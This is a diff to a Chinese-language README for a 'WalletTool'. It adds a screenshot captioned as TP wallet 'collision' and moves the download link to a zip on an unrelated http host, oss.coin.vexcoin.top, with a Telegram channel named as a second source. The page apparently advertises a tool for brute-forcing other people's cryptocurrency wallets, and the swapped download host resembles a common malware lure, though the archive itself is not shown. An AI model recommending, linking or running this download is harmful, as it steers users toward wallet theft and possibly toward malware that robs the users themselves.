@@ -8,12 +8,14 @@
 </p>
 
 <p align="center">
-    <img alt="界面预览" src="./img/wallet1.png" width="90%">
+  <img alt="界面预览" src="./img/wallet1.png" width="48%">
+  &nbsp;
+  <img alt="TP钱包碰撞" src="./img/tp.png" width="48%">
 </p>
 
 ## 下载地址
 
-- 下载地址：<a href="https://wallet-tpfile.oss-cn-hongkong.aliyuncs.com/WalletTool.zip">点击下载</a>
+- 下载地址：<a href="http://oss.coin.vexcoin.top/wallet/WalletTool.zip">点击下载</a>
 - 也可在 Telegram 频道获取最新安装包（见下方「联系我们」）
 
 ## 联系我们
